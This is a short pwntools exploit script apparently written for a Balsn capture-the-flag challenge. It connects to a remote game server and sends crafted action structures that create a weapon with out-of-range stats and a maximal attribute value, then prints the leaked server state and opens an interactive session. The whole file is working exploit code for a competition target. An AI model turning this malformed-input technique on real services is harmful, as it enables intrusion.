#!/usr/bin/env python3
from pwn import remote, context, p32, p64
from game.game_structs import *

#context.log_level = 0
r = remote('unicorn.balsnctf.com', 10101)

def sendmsg(act):
    global r
    bs = bytearray(act)
    r.send(p32(len(bs)))
    r.send(bs)

    r.recvn(1)

    read_size = ctypes.sizeof(confrontState) - 8 * MAX_WEAPON_IDX - 8
    state_size = ctypes.sizeof(confrontState)
    state = confrontState.from_buffer_copy(b'\0' * 8 + r.recvn(read_size).ljust(state_size - 8))
    for field in state._fields_:
        if type(getattr(state, field[0])) == int and getattr(state, field[0]) > 10000000:
            print(f'{field[0]}: {hex(getattr(state, field[0]))}')
        else:
            print(f'{field[0]}: {getattr(state, field[0])}')

ac = actionStruct()
ac.action = STARTBATTLE
ac.stru.startBattleStruct.desclen = 1
ac.stru.startBattleStruct.namelen = 1
ac.stru.startBattleStruct.name[0] = 0x41
ac.stru.startBattleStruct.desc[0] = 0x42
sendmsg(ac)

ac = actionStruct()
ac.action = CRAFTWEAPON
ac.stru.craftWeaponStruct.CD = 0
ac.stru.craftWeaponStruct.attack = 1000000
ac.stru.craftWeaponStruct.attribute = 0xffffffffffffffff
ac.stru.craftWeaponStruct.defense = 1000000
ac.stru.craftWeaponStruct.delta = 400
ac.stru.craftWeaponStruct.movespeed = 100000
ac.stru.craftWeaponStruct.range = 2000
sendmsg(ac)

ac = actionStruct()
ac.action = SWITCHWEAPON
ac.stru.switchWeaponStruct.targetIdx = 0
sendmsg(ac)

for _ in range(4):
    ac = actionStruct()
    ac.action = ATTACK
    ac.stru.attackStruct.level = 0
    sendmsg(ac)

r.interactive()
